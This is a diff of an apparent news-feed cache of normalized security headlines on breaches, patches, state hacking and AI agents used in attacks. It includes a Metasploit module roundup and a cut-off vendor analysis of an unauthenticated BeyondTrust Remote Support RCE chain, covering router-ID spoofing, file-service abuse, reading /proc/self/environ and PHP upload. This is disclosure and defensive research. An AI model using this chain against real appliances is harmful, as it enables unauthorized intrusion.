@@ -2,166 +2,6 @@
   "counts": {},
   "history": [
     {
-      "norm": "friday squid blogging increasing squid populations p this href i nature i argues s due overfishing predators warming sea temperatures p p usual you can also use this squid post talk about security stories news i haven t covered p p href moderation policy p",
-      "ts": 1792789733.6279671
-    },
-    {
-      "norm": "abandoned popcorn time app exposed millions device rce attacks researchers remotely disabled vulnerable updater abandoned time4popcorn app fork popcorn time bittorrent client closing security flaw could allowed attackers execute malicious code elevated privileges millions computers",
-      "ts": 1792789733.6279898
-    },
-    {
-      "norm": "there s third php2shell bug but won t get emergency fix bad things software bugs come threes",
-      "ts": 1792789733.6279964
-    },
-    {
-      "norm": "exposed php2shell cyber experts weigh advice fixing critical php flaws not simple clicking update here s assess your risk you can do protect yourself",
-      "ts": 1792789733.6280017
-    },
-    {
-      "norm": "red team report found openai utterly failed monitor agents during hugging face attack monitoring only partial easily bypassed",
-      "ts": 1792789733.6280065
-    },
-    {
-      "norm": "microsoft teams get ai powered context aware phishing detection microsoft announced plans add ai powered phishing detection teams messages starting early november 2026",
-      "ts": 1792789733.6280107
-    },
-    {
-      "norm": "blackx uefi bootkit bypasses secure boot patched windows systems missing revocations diplomatic organizations central asia been targeted sophisticated unified extensible firmware interface uefi bootkit called blackx activity which singled out diplomatic entities tajikistan uzbekistan turkmenistan early 2026 suspected orchestrated china linked state sponsored hacking group known apt41 kaspersky said technical report",
-      "ts": 1792789733.6280153
-    },
-    {
-      "norm": "ruby fixes three regex engine bugs responsible four critical gitlab rce flaws ruby released versions 4 0 9 3 4 12 3 3 13 fix three bugs onigmo regular expression engine built into language bugs lie behind four critical security flaws gitlab patched over past month gitlab found specially crafted pattern could corrupt memory while ruby compiles potentially leading code execution own servers ruby says any",
-      "ts": 1792789733.6280208
-    },
-    {
-      "norm": "exposed infrastructure reveals ransomware affiliates used ai agents execute intrusions cybersecurity researchers discovered artificial intelligence ai driven intrusion ecosystem run affiliates inc gentlemen ransomware groups central operation autonomous red team kill chain framework referred phantom threat actor assessed russian speaking functions both intrusion data extortion operator well",
-      "ts": 1792789733.6280258
-    },
-    {
-      "norm": "fcc bans two devices surveillance chips linked huawei banned items wireless video transmitter dashboard camera made chips manufactured huawei subsidiary hisilicon which markets products designed surveillance market",
-      "ts": 1792789733.6280305
-    },
-    {
-      "norm": "ai tools generating massive attacks little cost one campaign targets 105 sites using open weight models another public models gained full domain control 12 cyber defense change",
-      "ts": 1792789733.6280348
-    },
-    {
-      "norm": "microsoft windows server 2016 reaches end support january microsoft says windows server 2016 stop receiving security updates after reaches end support january 2027",
-      "ts": 1792789733.6280394
-    },
-    {
-      "norm": "quest diagnostics confirms data breach exposed patient records american clinical laboratory company quest diagnostics disclosed patient records been exposed after threat actor gained unauthorized access quanum lsm system",
-      "ts": 1792789733.6280458
-    },
-    {
-      "norm": "senators say targeted ads security risk ad groups say critics off base p citizen lab s adfection findings senators pushing industry improvements while iab europe google defend their vetting practices p p post href say targeted ads security risk ad groups say critics off base appeared first href",
-      "ts": 1792789733.628051
-    },
-    {
-      "norm": "metasploit wrap up langflow mongodb more p this release adds multiple modules 6 those modules point single target href open source llm workflow builder together they cover authentication bypass cve 2026 93680 3 unauthenticated remote code execution paths cve 2026 0768 cve 2026 0769 cve 2026 10134 2 authenticated code execution flaws cve 2026 7873 cve 2026 93674 spanning langflow releases 1 0 0 through 1 11 4 thanks work href research credit peter girnus n0k0 beyond langflow open source contributor href contributed pre auth rce chain against opencti mongodb coverage also been expanded 3 auxiliary modules plus apache solr version scanner thanks work community member href module content 11 h2 h3 4gaboards mass user information disclosure cve 2026 53959 h3 p authors balachandar gowrisankar de3erve github lucquach github p p type auxiliary p p pull request href contributed href gather 4gaboards users info disclosure cve 2026 53959 p p cve reference href adds module exploits cve 2026 53959 broken access control vulnerability allowing mass user information disclosure 4gaboards versions 3 3 8 below application s api users rest endpoint lets any authenticated user retrieve full unpaginated list every user system missing authorization checks allow attacker retrieve email phone organization name sso email addresses ssogoogleemail ssogithubemail others every user p h3 langflow ai authentication bypass cve 2026 93680 h3 p author richard howe p p type auxiliary p p pull request href contributed href gather langflow auth bypass cve 2026 93680 p p cve reference href adds auxiliary module leverages cve 2026 93680 authentication bypass vulnerability impacting langflow versions 1 5 0 through 1 11 4 p h3 apache solr version scanner h3 p author h00die p p type auxiliary p p pull request href contributed href scanner http apache solr version p p description adds scanner identifies apache solr reports version p h3 mongodb auxiliary module suite h3 p authors h00die prithvee07 p p type auxiliary p p pull request href contributed href adds mongodb version mongodb schemadump mongodb hashdump auxiliary modules updates existing mongodb login module p p this pr adds following modules p ul li scanner mongodb mongodb hashdump li li scanner mongodb mongodb schemadump li li scanner mongodb mongodb version li ul h3 opencti authentication bypass notifier ejs remote code execution h3 p author jean marie bourbon p p type exploit p p pull request href contributed href linux http opencti notifier rce p p cve references href href adds exploit module opencti chains cve 2026 27960 cve 2026 39980 achieve unauthenticated remote command execution p h3 grafana sql expressions duckdb command injection cve 2024 9264 h3 p author zcan ersan ozcanpng p p type exploit p p pull request href contributed href multi http grafana sql expressions rce cve 2024 9264 p p cve reference href adds authenticated exploit module cve 2024 9264 duckdb command injection grafana sql expressions p h3 langflow ai code validation authenticated rce cve 2026 7873 h3 p authors richard howe n0k0 p p type exploit p p pull request href contributed href multi http langflow auth rce cve 2026 7873 p p cve reference href adds exploit module detects exploits cve 2026 7873 authenticated rce vulnerability impacting langflow versions 1 0 0 through 1 10 0 p h3 langflow ai authenticated command injection cve 2026 93674 h3 p author richard howe p p type exploit p p pull request href contributed href multi http langflow auth command injection cve 2026 93674 p p cve reference href adds exploit module detects exploits cve 2026 93674 authenticated blind command injection vulnerability impacting langflow versions 1 5 0 through 1 9 0 p h3 langflow ai validate code injection unauth rce cve 2026 0768 h3 p authors peter girnus richard howe p p type exploit p p pull request href contributed href multi http langflow unauth rce cve 2026 0768 p p cve reference href adds exploit module detects exploits cve 2026 0768 unauthenticated remote code execution vulnerability impacting langflow version 1 4 2 p h3 langflow ai custom component eval injection unauth rce cve 2026 0769 h3 p authors peter girnus richard howe p p type exploit p p pull request href contributed href multi http langflow unauth rce cve 2026 0769 p p cve reference href adds exploit module detects exploits cve 2026 0769 unauthenticated rce vulnerability impacting langflow version 1 3 2 p h3 langflow ai public flow build unauth rce cve 2026 10134 h3 p author richard howe p p type exploit p p pull request href contributed href multi http langflow unauth rce cve 2026 10134 p p cve reference href adds exploit module detects exploits cve 2026 10134 unauthenticated remote code execution vulnerability impacting langflow versions 1 0 0 through 1 9 3 p h2 enhancements features 3 h2 ul li href href adds specs ensure mkdir post api behaves consistently li li href href consolidates reverse handler bind address handling into shared msf handler reverse bind module li li href href adds multiple meterpreter improvements windows meterpreter major reflective loader iat import reduction well improved winapi error handling mingw cmake build refinements python meterpreter improvements windows stat support freebsd process listing php meterpreter resolves php udp channel read bugs all meterpreters now align recursive mkdir p capabilities li ul h2 bugs fixed 6 h2 ul li href href fixes crash when fingerprinting http services contained null bytes li li href href adds additional http redirect checks multiple modules li li href href adds additional ftp pasv ip validation checks multiple modules li li href href fixes dirtyclone module metadata typo li li href href fixes leaking tcp sockets file descriptors when mssql login scanner module mssql session type used li li href href fixes false positives detection logic auxiliary gather hikvision info disclosure cve 2017 7921 auxiliary gather magento xxe cve 2024 34102 auxiliary scanner http elasticsearch traversal modules li ul h2 documentation h2 p you can find latest metasploit documentation our docsite href h2 p always you can update latest metasploit framework msfupdate you can get more details changes since last blog post github p ul li href requests 6 5 6 6 5 8 li li href diff 6 5 6 6 5 8 li ul p if you git user you can clone href framework repo master branch latest install fresh without using git you can use open source only href installers commercial edition href pro p",
-      "ts": 1792789733.6280553
-    },
-    {
-      "norm": "php shares mitigation rce vulnerability no patch php security team shared mitigation measures remote code execution vulnerability affects systems non default configurations no patch",
-      "ts": 1792789733.628058
-    },
-    {
-      "norm": "other news tor exit relays hijacked banks spot rogue ai agents self rebuilding macos ransomware p noteworthy stories might slipped under radar russia s apt28 hit nato defense firms pingcap source code stolen shinyhunters negotiator probe p p post href other news tor exit relays hijacked banks spot rogue ai agents self rebuilding macos ransomware appeared first href",
-      "ts": 1792789733.6280606
-    },
-    {
-      "norm": "you gave your ai agent access but who giving orders ai agents can manipulated through malicious emails websites plugins into executing commands stealing data deleting files using their legitimate permissions gen digital explains agent trust hub helps protect agents through skill verification secure connectivity runtime controls intercept dangerous act",
-      "ts": 1792789733.6280632
-    },
-    {
-      "norm": "caribbean threats cascade into global cyber risk region demonstrating happens when exploits accelerate but assurance does not",
-      "ts": 1792789733.6280656
-    },
-    {
-      "norm": "hackers breach enterprise firewalls vpns exposing over 70 000 credentials cybersecurity researchers disclosed details large scale campaign targeted exposed network edge devices such fortinet fortigate palo alto networks globalprotect firewalls artifacts this investigation also indicate operators this campaign obtained access numerous organizations worldwide attempted further compromise some victims",
-      "ts": 1792789733.6280684
-    },
-    {
-      "norm": "php2shell x burp suite detection your hands within day disclosure php2shell cve 2026 109618 cve 2026 109619 became latest vulnerability grab headlines around globe some estimates up 70 websites run least some php so if you re respons",
-      "ts": 1792789733.628071
-    },
-    {
-      "norm": "cyber insurance s reality underwriting isn t enough rising ai social engineering cloud risks pushing carriers beyond risk transfer deeper into cybersecurity itself",
-      "ts": 1792789733.6280737
-    },
-    {
-      "norm": "uk proposes 14 year prison terms undersea cable sabotage era hybrid threats british government wants update submarine telegraph act 1885 which carries maximum fine 1 000 five years imprisonment cases deliberate damage",
-      "ts": 1792789733.6280766
-    },
-    {
-      "norm": "quest diagnostics warns potential data theft after attack lab service system nationwide lab test company quest diagnostics said one key systems may experienced breach patient data",
-      "ts": 1792789733.6280792
-    },
-    {
-      "norm": "hpe patches eight max severity rce auth bypass aos flaws hewlett packard enterprise hpe released security updates patch 72 vulnerabilities aruba operating system arubaos including eight maximum severity authentication bypass code execution issues",
-      "ts": 1792789733.6280816
-    },
-    {
-      "norm": "mirai botnet operators join php2shell attacks aslr bypass exploits emerge p researchers tie php2shell attempts mirai botnet show aslr bypass but no successful compromise been confirmed yet p p post href botnet operators join php2shell attacks aslr bypass exploits emerge appeared first href",
-      "ts": 1792789733.6280844
-    },
-    {
-      "norm": "uk proposes 14 year jail terms subsea cable saboteurs p damaging cable seabed off uk coast could soon cost someone 14 years their life behind bars under plans british government published this week proposal comes white paper department digital culture media sport would update laws protecting undersea cables pipelines some which date back 140 years plans include unlimited fines ship owners whose vessels damage infrastructure href rel nofollow more span class meta nav span p p post href proposes 14 year jail terms subsea cable saboteurs appeared first href net security p",
-      "ts": 1792789733.6280873
-    },
-    {
-      "norm": "hacker leaks 281 gb data germany s far right afd party afd confirmed hackers breached hosting provider leak site now claims offer 421 179 party s internal emails shows ai written summaries rather than emails themselves read more my article hot security blog",
-      "ts": 1792789733.6280904
-    },
-    {
-      "norm": "microsoft 365 accounts compromised 79 organizations no passwords needed p attacker who spent ten weeks replaying stolen microsoft 365 sign sessions broke into email accounts 79 organizations used hidden inbox rules keep victims seeing parts their own mail according huntress researchers tracked campaign between july 14 september 22 2026 counting 497 successful sign ins more than 200 000 failed login attempts stolen sessions replayed servers 1337 services gmbh hosting provider incorporated href rel nofollow more span class meta nav span p p post href 365 accounts compromised 79 organizations no passwords needed appeared first href net security p",
-      "ts": 1792789733.6280932
-    },
-    {
-      "norm": "gaming giant capcom confirms data breach exposed users personal information japanese video games giant capcom confirmed unauthorized access online account system",
-      "ts": 1792789733.628096
-    },
-    {
-      "norm": "ai agents insider threats inside microsoft s bet unified security stack microsoft s project perception adds guardian agents monitor contain anomalous ai agents but experts warn policing unpredictable agents other agents may compound not contain risk",
-      "ts": 1792789733.6280985
-    },
-    {
-      "norm": "torvalds ai fine competent devs but spare us drive patches kernel maintainers stop asking who used ai long code good",
-      "ts": 1792789733.628101
-    },
-    {
-      "norm": "php warns another unpatched rce risk two days after emergency php2shell patches php warned another way attacker could run code web server two days after shipped emergency fixes critical php2shell flaws issue assigned cve 2026 115560 affects only web applications configured unusual way php considers unlikely risk project not issuing emergency fix instead recommends turning off feature called",
-      "ts": 1792789733.6281037
-    },
-    {
-      "norm": "russia linked hackers used mesh network backdoor destructive ukraine attack russian state sponsored hacking group sandworm teamed up another threat actor carry out destructive wiping attack targeting ukrainian logistics company last year according eset attack involved uac 0099 aka earth sirrush obtaining initial access target july 16 2025 via spear phishing email bearing malware laced attachment led deployment",
-      "ts": 1792789733.6281064
-    },
-    {
-      "norm": "reports php bug exploitation attempts grow experts downplay viability exploits headline grabbing bugs known colloquially php2shell giving cyber analysts lot track lot debunk",
-      "ts": 1792789733.6281085
-    },
-    {
-      "norm": "ai risks grow insurers split covering damage some build specialized agentic ai coverage while major carriers quietly exclude leaving enterprises exposed without their knowledge",
-      "ts": 1792789733.628111
-    },
-    {
-      "norm": "whitehall shuts front door digital id but leaves back open ministers may scrapped national scheme but one login digital wallets 80 plus planned credentials still very much alive",
-      "ts": 1792789733.6281135
-    },
-    {
-      "norm": "uk finance watchdog wants firms report ai failures close calls fca seeks clear accountability financial services embrace increasingly autonomous agents",
-      "ts": 1792789733.628116
-    },
-    {
-      "norm": "ad scam tell before you click you can trust social media platform still get scammed ad running",
-      "ts": 1792789733.6281185
-    },
-    {
-      "norm": "cyber resilience now boardroom priority uk public services partner content happens after inflection point",
-      "ts": 1792789733.6281211
-    },
-    {
       "norm": "researchers push over 2 million updates remotely disable popcorn time updater could fuel botnet between november 2025 march 2026 dutch security firm eye security pushed more than 2 million updates computers did not own switch off background updater said could allowed outsider take over machine updater belongs time4popcorn abandoned copy popcorn time free app streamed pirated films tv over bittorrent popcorn time",
       "ts": 1792837883.222992
     },
@@ -2252,13 +2092,176 @@
     {
       "norm": "eset apt activity report q2 2026 q3 2026 overview activities selected apt groups investigated analyzed eset research q2 2026 q3 2026",
       "ts": 1793362933.526187
+    },
+    {
+      "norm": "syrian hacker behind fake tweet triggered 136 billion market drop gets 42 months prison ahmad umar agha syrian electronic army hacker known online th3pr0 been sentenced u s federal court 42 months prison his role hacking conspiracy targeted western news outlets conspiracy organized led members former syrian president bashar al assad s inner circle including commander syria s general intelligence",
+      "ts": 1793397716.3045738
+    },
+    {
+      "norm": "china backed threat group used agentic ai pentesting tool compromise 140 sensitive targets 11 days p vapor panda targeted more than 200 organizations spanning least 14 countries according crowdstrike ongoing campaign remarkably successful operating shocking speed p p post href threat group used agentic ai pentesting tool compromise 140 sensitive targets 11 days appeared first href",
+      "ts": 1793397723.854765
+    },
+    {
+      "norm": "critical linux kernel flaw allows remote root attacks mptcp servers security researchers anthropic developed exploit critical linux kernel vulnerability allows unauthenticated attackers remotely execute commands root servers running multipath tcp mptcp listeners",
+      "ts": 1793397723.854782
+    },
+    {
+      "norm": "friday squid blogging bigfin squid off california coast p neat href blockquote p sighting announced september 2 marks first time anyone spotted live bigfin squid which belongs i magnapinna i genus northeastern pacific ocean p blockquote p usual you can also use this squid post talk about security stories news i haven t covered p p href moderation policy p",
+      "ts": 1793397723.8547864
+    },
+    {
+      "norm": "doj raises privacy concerns over potential sale character ai chats doj s executive office u s trustees said consumer privacy ombudsman needed advise court regulate data character ai can sold under terms",
+      "ts": 1793397723.85479
+    },
+    {
+      "norm": "devs hit trojanized claude code extension cursor two serious security issues hit cursor same day highlighting risks ai powered integrated development environments ides",
+      "ts": 1793397723.8547933
+    },
+    {
+      "norm": "crim spent 7k ai services extortion attacks then left evidence all see n0n existent security",
+      "ts": 1793397723.8547971
+    },
+    {
+      "norm": "fashion retailer resolve says hackers stole payment card information company billing itself next generation fashion retailer millennial generation z consumers said recent hack exposed customer payment card numbers",
+      "ts": 1793397723.8547995
+    },
+    {
+      "norm": "apple notifications alert victims 99 countries about mercenary spyware infections p notifications come shortly before pall mall process nearing final negotiations guidelines use commercial hacking tools p p post href notifications alert victims 99 countries about mercenary spyware infections appeared first href",
+      "ts": 1793397723.8548021
+    },
+    {
+      "norm": "chinese hackers use ai powered artex target over 200 organizations worldwide chinese state sponsored threat actors been observed using go based artificial intelligence ai powered penetration testing framework called artex attacks aimed high value targets simultaneously activity been attributed crowdstrike china based targeted intrusion adversary tracks under moniker vapor panda previously vexatioustemper first identified",
+      "ts": 1793397723.8548052
+    },
+    {
+      "norm": "gm cracks petty cash box multistate driver tracking settlement 220 million all you yeah we can probably dig up",
+      "ts": 1793397723.8548086
+    },
+    {
+      "norm": "anthropic claude code extension compromise couldn t us claudeshop fingers malicious actor targeted supply chain attack cursor",
+      "ts": 1793397723.854812
+    },
+    {
+      "norm": "rapid7 analysis unauthenticated file upload rce beyondtrust remote support cve 2026 102764 h2 style direction ltr overview h2 p style direction ltr span style font size undefined origin validation flaw beyondtrust remote support lets unauthenticated attacker write files appliance execute code site s operating system user entry point public customer connection used start support session no account credentials user interaction required span p p style direction ltr span style font size undefined flaw sits between internal message router span span style color rgb 24 128 56 font size undefined brain span span style font size undefined appliance side customer worker span span style color rgb 24 128 56 font size undefined thin scc span span style font size undefined attacker can put reserved local router id into message s source address router forwards message worker accepts address proof request came local component this gives attacker access internal file transfer service including native filesystem provider span p p style direction ltr span style font size undefined we first confirmed file write then used primitive upload php file site s public directory requesting file gave us code execution site user span href target self span style font size undefined metasploit module span span style font size undefined now implements chain php unix command targets span p p style direction ltr span style font size undefined we tested span span style font size undefined strong remote support 24 1 2 build 1524046 strong span span style font size undefined revision span span style color rgb 24 128 56 font size undefined span 4208 ddcf90715106aa0c0e19c103f8d2c412af4beff3 span span span style font size undefined test appliance had public issue menu session starts thin chat enabled default other affected releases fixed builds not been established vm s base appliance version secure remote access span span style font size undefined strong 7 1 0 strong span span style font size undefined separate remote support application version span p h2 style direction ltr impact h2 p style direction ltr span style font size undefined attacker controls both contents uploaded file destination path subject worker s filesystem permissions same origin forgery also reaches file send operation we used retrieve span span style color rgb 24 128 56 font size undefined proc self environ span span style font size undefined determine base installation path remote support before dropping payload span p p style direction ltr span style font size undefined tested appliance native file service could write into php document root metasploit module returns code execution context span span style color rgb 24 128 56 font size undefined msfuser span span style font size undefined uid 1000 which establishes unauthenticated remote code execution site user span p h2 style direction ltr technical analysis h2 p style direction ltr span style font size undefined we demonstrate attacker can start anonymous session then forge message appliance accept local then outline we can reach native file transfer service choose uploaded file s contents destination turn file write into php execution span p p style direction ltr span style font size undefined addresses use ghidra image base span span style color rgb 24 128 56 font size undefined 0x100000 span span style font size undefined subtract value raw elf virtual address function names beginning span span style color rgb 24 128 56 font size undefined fun span span style font size undefined ghidra labels descriptive names taken diagnostic strings where available span p h3 style direction ltr span style color rgb 67 67 67 starting anonymous customer session span h3 p style direction ltr span style font size undefined we begin obtaining two customer keys span span style color rgb 24 128 56 font size undefined post api start session span span style font size undefined these fresh public guest sessions keys let client use customer transport but do not identify logged account each guest connects through span span style color rgb 24 128 56 font size undefined nw span span style font size undefined websocket endpoint using either native thin customer protocol span p p style direction ltr span style font size undefined source app write app chooser config span p pre echo ingredi support desk customer bg app root data tmp brain sock a1 echo ingredi support desk customer thin bg app root app thin scc wrapper a2 pre p style direction ltr span style color rgb 24 128 56 font size undefined span p p span style color rgb 24 128 56 font size undefined app write app chooser config span span style font size undefined shows where two customer protocols go native protocol reaches brain socket span span style color rgb 24 128 56 font size undefined a1 span span style font size undefined thin protocol launches wrapper span span style color rgb 24 128 56 font size undefined a2 span span style font size undefined span p p style direction ltr span style font size undefined source app thin scc wrapper span p pre omitted protocol parsing alternative debug site branch quoted export phprc bg app root config php cli ini echo gskey ingrediroot app dbquote if echo select count 1 gw sessions where session key quoted session type sdcust expiration null expiration now db 1 then a3 echo 1 failure 0 exit 0 fi omitted reconnect throttling customer name setup settings generation pre p style direction ltr span style color rgb 24 128 56 font size undefined span p p span style color rgb 24 128 56 font size undefined app thin scc wrapper span span style font size undefined checks thin customer s key belongs unexpired span span style color rgb 24 128 56 font size undefined sdcust span span style font size undefined session span span style color rgb 24 128 56 font size undefined a3 span span style font size undefined key obtained through public session start endpoint passes this check span p p style direction ltr span style color rgb 24 128 56 font size undefined app thin scc wrapper span span style font size undefined after session check span p pre echo 0 success 0 workdir handlethinmint thinmint exit if f workdir thin scc then pushd workdir cp ingrediroot app thin scc omitted license image settings ini setup else pushd workdir fi export brain meld socket path ingrediroot data tmp brain sock omitted server side environment initialization thin scc a4 starts worker inside appliance environment exitstatus pre p style direction ltr span style font size undefined span p p span style font size undefined same wrapper then prepares working directory starts span span style color rgb 24 128 56 font size undefined thin scc span span style font size undefined span span style color rgb 24 128 56 font size undefined a4 span span style font size undefined this process runs appliance even though handling anonymous customer s thin session span p p style direction ltr span style font size undefined native connection gives us client internal message routing system referred here mrs thin connection gives us appliance side worker address neither step requires representative accept session span p h3 style direction ltr span style color rgb 67 67 67 network message can claim local span h3 p style direction ltr span style font size undefined mrs addresses three parts span span style color rgb 24 128 56 font size undefined node router handler span span style font size undefined each message carries source destination addresses 36 byte header made up nine little endian 32 bit fields span p table thead tr th p style direction ltr span style font size undefined strong header offset strong span p th th p style direction ltr span style font size undefined strong field strong span p th th p style direction ltr span style font size undefined strong value used exploit strong span p th tr thead tbody tr td p style direction ltr span style color rgb 24 128 56 font size undefined 0x04 span p td td p style direction ltr span style font size undefined source node span p td td p style direction ltr span style font size undefined customer s normal node span p td tr tr td p style direction ltr span style color rgb 24 128 56 font size undefined 0x08 span p td td p style direction ltr span style font size undefined source router span p td td p style direction ltr span style font size undefined changed reserved value span span style color rgb 24 128 56 font size undefined 1 span p td tr tr td p style direction ltr span style color rgb 24 128 56 font size undefined 0x0c span p td td p style direction ltr span style font size undefined destination node span p td td p style direction ltr span style font size undefined worker s node span p td tr tr td p style direction ltr span style color rgb 24 128 56 font size undefined 0x10 span p td td p style direction ltr span style font size undefined destination router span p td td p style direction ltr span style font size undefined worker s router span p td tr tr td p style direction ltr span style color rgb 24 128 56 font size undefined 0x14 span p td td p style direction ltr span style font size undefined destination handler span p td td p style direction ltr span style font size undefined main dispatcher span span style color rgb 24 128 56 font size undefined 2048 span span style font size undefined tested build span p td tr tr td p style direction ltr span style color rgb 24 128 56 font size undefined 0x24 span p td td p style direction ltr span style font size undefined payload span p td td p style direction ltr span style font size undefined service name newline then packed fields span p td tr tbody table p p p style direction ltr span style font size undefined app brain ingress check span p pre if int long param 2 0xc int param 1 0x10 uint param 2 4 uint byte param 2 4 if int param 2 1 int long param 1 0x84 param 3 ulong 0x0 b1 rejects network claim this router s actual id if lram0000000001ec8610 0 func 0x0168de00 0x15 3 dropping spoofed message came network but routerid our own n else if int long param 1 0x84 int param 2 2 omitted delivery handler this router else omitted ttl checks route lookup forwarding branches pre p p p style direction ltr span style color rgb 24 128 56 font size undefined app brain span span style font size undefined anti spoofing check span span style color rgb 24 128 56 font size undefined fun 01566ae0 span span style font size undefined identified span span style color rgb 24 128 56 font size undefined handlemessagefromotherrouter span span style font size undefined diagnostic span span style color rgb 24 128 56 font size undefined b1 span span style font size undefined rejects network packet whose source router matches receiving router s actual id span p p style direction ltr span style font size undefined here span span style color rgb 24 128 56 font size undefined param 1 span span style font size undefined receiving router span span style color rgb 24 128 56 font size undefined param 2 span span style font size undefined packet span span style color rgb 24 128 56 font size undefined param 3 span span style font size undefined incoming connection because span span style color rgb 24 128 56 font size undefined param 2 span span style font size undefined points eight byte elements span span style color rgb 24 128 56 font size undefined int param 2 1 span span style font size undefined reads source router byte offset span span style color rgb 24 128 56 font size undefined 0x08 span span style font size undefined span p p style direction ltr span style font size undefined leaves gap check compares against actual router id while downstream code also recognises reserved local alias this appliance alias span span style color rgb 24 128 56 font size undefined 1 span span style font size undefined span p pre omitted destination route resolution loop checks diagnostic logging fun 0155ec40 ppustack 1300 ppuvar6 param 2 b2 forwards packet carrying caller supplied source router int long param 2 0x24 pre p p p style direction ltr span style font size undefined forwarding path same span span style color rgb 24 128 56 font size undefined app brain span span style font size undefined function passes packet onward span span style color rgb 24 128 56 font size undefined b2 span span style font size undefined does not remove source claim matters worker s local origin check span p p style direction ltr span style font size undefined app brain local address predicate span p pre bool fun 0155ad40 long param 1 int param 2 bool bvar1 bvar1 false if param 2 int param 1 0x80 c1 address node must match local node bvar1 true if param 2 1 1 c2 router 1 returns true without actual id comparison return int param 1 0x84 param 2 1 return bvar1 pre p p p style direction ltr span style font size undefined local address predicate makes mismatch clear span span style color rgb 24 128 56 font size undefined app brain span span style font size undefined span span style color rgb 24 128 56 font size undefined fun 0155ad40 span span style font size undefined first checks node span span style color rgb 24 128 56 font size undefined c1 span span style font size undefined if matches router span span style color rgb 24 128 56 font size undefined 1 span span style font size undefined enough return true span span style color rgb 24 128 56 font size undefined c2 span span style font size undefined comparison actual local router skipped span p p style direction ltr span style font size undefined rule effectively span span style color rgb 24 128 56 font size undefined node router 1 router actual local router span span style font size undefined address supplied network client being used make decision span p p style direction ltr span style font size undefined app thin scc message origin wrapper span p pre unrecovered jumptable code long param 1 8 0x50 unrecovered jumptable long param 1 8 param 1 0xb c3 uses dispatched message s sender address byte offset 0x58 unrecovered jumptable pre p span style font size undefined span p p style direction ltr span style font size undefined corresponding message wrapper span span style color rgb 24 128 56 font size undefined app thin scc span span style font size undefined passes message s sender address into router object s local address predicate span span style color rgb 24 128 56 font size undefined c3 span span style font size undefined ghidra did not recover reliable prototype this indirect call caller consumes result boolean span p p style direction ltr span style font size undefined we checked this behaviour same file service request under two origins ordinary customer source produced no file service connection during two second observation changing source router span span style color rgb 24 128 56 font size undefined 1 span span style font size undefined caused worker accept span p h3 style direction ltr span style color rgb 67 67 67 reaching native file transfer service span h3 p style direction ltr span style font size undefined span span style color rgb 24 128 56 font size undefined app thin scc span span style font size undefined span span style color rgb 24 128 56 font size undefined fun 0047a850 span span style font size undefined dispatches file transfer messages span p p style direction ltr span style font size undefined app thin scc file transfer dispatcher span p pre cvar3 func 0x0068e930 param 2 d1 locality derived message sender address if cvar3 0 if lram00000000009bade8 0 puvar5 undefined8 func 0x0068efe0 param 2 func 0x00309380 0x66 3 discarding nonlocal message s n puvar5 else func 0x0046d370 aplstack 68 ftsname lvar7 param 2 0x28 lvar1 param 2 0x30 lvar6 func 0x002a1970 lvar7 aplstack 68 if lvar1 lvar6 puvar5 undefined8 0x9c3700 else puvar5 undefined8 lvar6 0x40 if puvar5 1 long param 1 0x2a8 puvar5 1 0 ivar4 func 0x001804b0 puvar5 undefined8 param 1 0x2a0 ivar4 0 d2 matches requested filesystem service name omitted string cleanup optional reply check action dispatch shown below omitted mismatched name cleanup pre p p p style direction ltr span style font size undefined calls origin wrapper span span style color rgb 24 128 56 font size undefined d1 span span style font size undefined discards message if wrapper says sender nonlocal once check passes span span style color rgb 24 128 56 font size undefined d2 span span style font size undefined matches span span style color rgb 24 128 56 font size undefined ftsname span span style font size undefined against service instance s name span p p style direction ltr span style font size undefined same function only validates span span style color rgb 24 128 56 font size undefined responseaddress span span style font size undefined when field nonempty exploit omits taking branch span span style color rgb 24 128 56 font size undefined d3 span span style font size undefined span p p style direction ltr span style color rgb 24 128 56 font size undefined app thin scc span span style font size undefined reply address handling span span style color rgb 24 128 56 font size undefined fun 0047a850 span span style font size undefined span p pre func 0x0046d370 austack a8 responseaddress lvar6 func 0x002a1970 lvar7 austack a8 if lvar6 lvar1 lvar6 0x9c3700 else lvar6 lvar6 0x40 if long lvar6 8 0 d3 no reply address validation when field empty func 0x001edfe0 austack a8 else func 0x0046d370 austack 88 responseaddress lvar8 func 0x002a1970 lvar7 austack 88 lvar6 lvar8 0x40 if lvar8 lvar1 lvar6 0x9c3700 func 0x006f2e80 austack b4 lvar6 func 0x0046d370 aplstack 68 processmessage cvar3 func 0x0068e950 param 2 aplstack 68 austack b4 d4 omitted temporary string destruction if cvar3 0 goto lab 0047a8be pre p p p style direction ltr span style font size undefined validator called span span style color rgb 24 128 56 font size undefined d4 span span style font size undefined compares reply address against message s sender address does not independently establish where sender came so making this field mandatory would not fix origin forgery span p p style direction ltr span style color rgb 24 128 56 font size undefined app thin scc span span style font size undefined action handling span span style color rgb 24 128 56 font size undefined fun 0047a850 span span style font size undefined span p pre omitted action extraction unrelated action cases ivar4 func 0x0046d240 uvar9 uvar2 downloadanonymousfiles if ivar4 0 uvar9 fun 00475820 param 1 param 2 d5 receives file into selected provider goto lab 0047a8c0 omitted downloadfiles case ivar4 func 0x0046d240 uvar9 uvar2 uploadfiles if ivar4 0 uvar9 fun 00477be0 param 1 param 2 d6 sends file selected provider goto lab 0047a8c0 pre p p p style direction ltr span style font size undefined dispatcher then exposes span span style color rgb 24 128 56 font size undefined downloadanonymousfiles span span style font size undefined span span style color rgb 24 128 56 font size undefined d5 span span style font size undefined span span style color rgb 24 128 56 font size undefined uploadfiles span span style font size undefined span span style color rgb 24 128 56 font size undefined d6 span span style font size undefined span p p style direction ltr span style font size undefined action names describe worker s side transfer span span style color rgb 24 128 56 font size undefined downloadanonymousfiles span span style font size undefined receives bytes onto appliance span span style color rgb 24 128 56 font size undefined uploadfiles span span style font size undefined sends file out upload our file we ask worker download mrs listener we control span p p style direction ltr span style font size undefined important thing note here worker more than one filesystem provider span span style color rgb 24 128 56 font size undefined session span span style font size undefined service delegates filesystem work browser successful transfer through service does not prove file written appliance span span style color rgb 24 128 56 font size undefined local span span style font size undefined service uses native file objects instead span p p style direction ltr span style font size undefined app thin scc native service construction span p pre uvar3 func 0x00770620 0x310 plvar4 long func 0x00770620 8 func 0x003454a0 plvar4 e1 constructs native filesystem provider pplstack c0 long 0x0 plstack c8 plvar4 pplstack c0 long func 0x00770620 0x18 plvar1 dat 007d4de0 pplstack c0 2 plvar4 pplstack c0 1 plvar1 pplstack c0 long unk 0098cee0 plstack 60 long 0x5 ustack 58 long concat26 ustack 58 6 2 0x6c61636f6c e2 ascii local plstack 68 ustack 58 fun 00472550 uvar3 plstack 68 param 3 plstack c8 e3 service receives name provider param 1 0x9d uvar3 omitted string provider 